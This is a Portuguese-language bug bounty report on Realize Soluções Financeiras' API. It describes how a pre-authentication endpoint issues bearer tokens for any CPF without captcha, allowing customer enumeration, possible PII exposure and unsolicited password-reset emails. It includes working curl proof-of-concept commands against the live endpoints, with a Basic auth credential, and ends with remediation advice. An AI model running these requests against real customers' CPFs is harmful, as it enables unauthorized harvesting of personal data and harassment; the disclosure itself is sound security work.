# R7: Token de Pré-Autenticação Emitido para Qualquer CPF sem Captcha — Possível Enumeração de Clientes + Divulgação de PII

**Programa:** BugPay Haven — Realize Soluções Financeiras (realizesolucoesfinanceiras.com.br)  
**Asset afetado:** `api.realizesolucoesfinanceiras.com.br`  
**Endpoints:** `POST /api/v2/primeiro-acesso/pre-autenticar` · `GET /api/autenticacao/user`  
**Severidade:** HIGH (potencial) / MEDIUM (confirmado)  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) — estimado  
**CWE:** CWE-204 — Observable Response Discrepancy · CWE-359 — Exposure of Private Personal Information  
**Descoberto:** 2026-06-29  
**Status:** Ready to submit

---

## Resumo

O endpoint `POST /api/v2/primeiro-acesso/pre-autenticar` emite tokens Bearer válidos para **qualquer CPF informado, sem captcha e sem verificação de existência do cliente**. O token emitido (scope: `aplicativo_fator_seguranca`) tem acesso ao endpoint `GET /api/autenticacao/user`, que retorna dados do perfil do cliente.

Para clientes reais da Realize, esse endpoint provavelmente retorna **nome, número de conta, produto (ex: Cartão Renner) e situação de autenticação** — dados pessoais sensíveis — sem que o solicitante precise provar que é o titular da conta.

---

## Prova de Conceito (Confirmada com CPF de Teste)

### Passo 1 — Obter Bearer token para qualquer CPF (sem captcha, sem senha)

```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/v2/primeiro-acesso/pre-autenticar" \
  -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"00000000191"}'
```

**Resposta (HTTP 200 — imediata, sem captcha):**
```json
{
  "access_token": "252b48eb-4a6e-421e-815a-34d8ba237084",
  "token_type": "bearer",
  "refresh_token": null,
  "expires_in": 3599,
  "scope": "aplicativo_fator_seguranca"
}
```

CPF `000.000.001-91` é matematicamente válido (passa o algoritmo de verificação) mas não corresponde a nenhum cliente real. Mesmo assim, o servidor emite um token com validade de **1 hora**.

### Passo 2 — Consultar perfil de usuário com o token emitido

```bash
curl -s \
  "https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/user" \
  -H "Authorization: Bearer 252b48eb-4a6e-421e-815a-34d8ba237084"
```

**Resposta (HTTP 200):**
```json
{
  "hash": "3063d153fa20d07a4a2671bbec38df27444dff886539a1f4d5d21cafd15d22bb",
  "cpf": "00000000191",
  "nome": null,
  "conta": null,
  "processadora": null,
  "produto": null,
  "situacaoAutenticacao": null,
  "bloqueios": null
}
```

Para o CPF inexistente, os campos retornam `null`. **Para um CPF real de cliente Realize**, os campos `nome`, `conta`, `produto` provavelmente são populados com dados reais.

### Passo 3 — Validar com CPF próprio (ação para o programa)

Para confirmar o impacto total, o time de segurança da Realize deve executar:

```bash
# Substituir por CPF de uma conta de teste interna
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/v2/primeiro-acesso/pre-autenticar" \
  -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"CPF_DE_TESTE_INTERNO"}'
# → Salvar access_token

curl -s \
  "https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/user" \
  -H "Authorization: Bearer ACCESS_TOKEN_DO_PASSO_ANTERIOR"
# → Verificar se nome/conta são retornados
```

**Se `nome` e `conta` retornarem dados reais**: vulnerabilidade confirmada como HIGH (divulgação de PII via CPF simples).  
**Se campos permanecerem null para clientes reais**: vulnerabilidade classificada como MEDIUM (emissão de token sem verificação, potencial user enumeration por respostas diferenciadas).

---

## Descoberta Adicional: Endpoint de Recuperação de Senha Também Vulnerável

```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/v2/recuperar-senha/pre-autenticar" \
  -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"00000000191"}'
```

**Resposta (HTTP 200):**
```json
{
  "access_token": "7239b296-6df2-4146-af77-187fd366be9e",
  "token_type": "bearer",
  "refresh_token": "81dc4a29-ca42-4f87-a3f7-ac590e2fbac7",
  "expires_in": 1199,
  "scope": "pre_autorizado"
}
```

Este token tem scope `pre_autorizado` e inclui **refresh_token** (validade indefinida enquanto não revogado). Com ele, é possível chamar:

```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/v2/recuperar-senha/email/enviar" \
  -H "Authorization: Bearer 7239b296-6df2-4146-af77-187fd366be9e"
# HTTP 200 — email de recuperação acionado para CPF real
```

Para CPFs reais de clientes, este fluxo pode **acionar emails de recuperação de senha sem o consentimento do titular** — potencial vetor de phishing e spam.

---

## Ausência de Rate Limiting Confirmada

```bash
# 5 chamadas consecutivas sem headers de rate limiting na resposta
for i in {1..5}; do
  curl -sI -X POST \
    "https://api.realizesolucoesfinanceiras.com.br/api/v2/primeiro-acesso/pre-autenticar" \
    -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
    -H "Content-Type: application/json" \
    -d '{"cpf":"00000000191"}' 2>&1 | grep -i "ratelimit\|x-rate\|retry"
done
# Nenhum header de rate limiting detectado
```

---

## Impacto ao Negócio

### Cenário 1: Enumeração de Clientes (MEDIUM)
Um atacante com lista de CPFs (amplamente disponível no Brasil) pode descobrir quais CPFs correspondem a clientes Realize pela diferença de resposta no endpoint `/api/autenticacao/user`:
- CPF inexistente: `{"nome":null,"conta":null,...}`
- CPF de cliente: `{"nome":"João Silva","conta":"12345678","produto":"CARTAO_RENNER",...}`

### Cenário 2: Divulgação de PII (HIGH)
Se `nome`, `conta` e `produto` são retornados para clientes reais com o scope `aplicativo_fator_seguranca`, qualquer atacante com CPF alvo obtém gratuitamente: nome completo, número de conta, produto financeiro — sem senha, sem captcha, sem autenticação.

### Cenário 3: Acionamento Não Autorizado de Reset de Senha (MEDIUM)
Via `/api/v2/recuperar-senha/pre-autenticar` + `/email/enviar`: spamming de emails de recuperação de senha para clientes Realize, usável como pré-ataque de phishing (email legítimo da Realize chegando para o alvo).

---

## Remediação

### Imediato (P0)
1. **Verificar se CPF existe na base antes de emitir token**: O endpoint `pre-autenticar` deve retornar `404` ou resposta genérica se o CPF não for cliente (sem emitir token).
2. **Adicionar captcha ao endpoint `pre-autenticar`**: Ambos os endpoints (`primeiro-acesso` e `recuperar-senha`) devem exigir captcha antes de emitir qualquer token.

### Curto prazo (P1)
3. **Rate limiting**: Máximo de 3-5 tentativas por IP por hora nos endpoints de pré-autenticação.
4. **Limitar scope do token `aplicativo_fator_seguranca`**: Se `GET /api/autenticacao/user` retorna PII com esse scope, restringir o retorno apenas ao `hash` (sem `nome`, `conta`, `produto`).
5. **Monitorar uso anômalo**: Alertas para IPs que fazem >10 chamadas/minuto a `pre-autenticar`.

### Longo prazo (P2)
6. **Notificação ao titular**: Enviar notificação (SMS/email) sempre que `primeiro-acesso/pre-autenticar` for chamado com o CPF do cliente.

---

## Referências

- CWE-204: Observable Response Discrepancy (User Enumeration)
- CWE-359: Exposure of Private Personal Information to an Unauthorized Actor
- OWASP Testing Guide — OTG-IDENT-004: Testing for Account Enumeration
- LGPD Art. 7 e Art. 46 — Tratamento e proteção de dados pessoais
- Endpoints afetados: `api.realizesolucoesfinanceiras.com.br` (inscope)
